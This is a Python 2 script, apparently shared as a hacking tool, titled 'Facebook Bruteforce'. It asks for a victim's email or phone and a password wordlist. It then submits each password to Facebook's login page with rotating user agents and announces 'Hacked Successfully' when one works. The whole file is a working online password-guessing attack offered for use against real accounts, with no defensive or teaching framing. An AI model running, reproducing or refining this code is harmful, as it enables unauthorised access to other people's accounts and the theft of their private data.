reset='\033[0m'
bold='\033[01m'
disable='\033[02m'
underline='\033[04m'
reverse='\033[07m'
strikethrough='\033[09m'
invisible='\033[08m'
    
black='\033[30m'
red='\033[31m'
green='\033[32m'
orange='\033[33m'
blue='\033[34m'
purple='\033[35m'
cyan='\033[36m'
lightgrey='\033[37m'
darkgrey='\033[90m'
lightred='\033[91m'
lightgreen='\033[92m'
yellow='\033[93m'
lightblue='\033[94m'
pink='\033[95m'
lightcyan='\033[96m'

black='\033[40m'
red='\033[41m'
green='\033[42m'
orange='\033[43m'
blue='\033[44m'
purple='\033[45m'
cyan='\033[46m'
lightgrey='\033[47m'


import sys,time,os
import mechanize
import cookielib
import random
os.system('clear')
print ('Edmark.net')

os.system('clear')



print("                                   Edmark.net ")
print("                              Facebook Bruteforce")
print("                                  Version: V3")
print("                         Created by: Edmark Jay Sumampen")
print



#email
email = str(raw_input(cyan + "\n\nEmail or Phone: " + reset))
wp = 'wordlist.txt'
#wordlist
passwordlist = str(raw_input(cyan + "WordListPath / Enter to Start: " + reset)) + wp

#Target Website
login = 'https://www.facebook.com/login.php?login_attempt=1'

#useragents
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")
	exit()
	
	



def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print(green + "\n[+] Email/Phone: " + email + " Password: {}".format(password))
			print(green + "[+] " + email + " Has been Hacked Successfully!!!" + reset) 
			m = raw_input('\n\n\n Do You want to exit? [Y/n]: ')
			if m == 'y':
				exit()
			elif m == 'n':
				os.system("clear")
				os.system("python2 fb.py")
				


def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)


#welcome 
def welcome():
	total = open(passwordlist,"r")
	total = total.readlines()
	print
	print (" [*] Account to crack : {}".format(email))
	print " [*] Possible Password: " , len(total)
	print (" [*] Cracking, please wait ...\n\n")


if __name__ == '__main__':
	main()
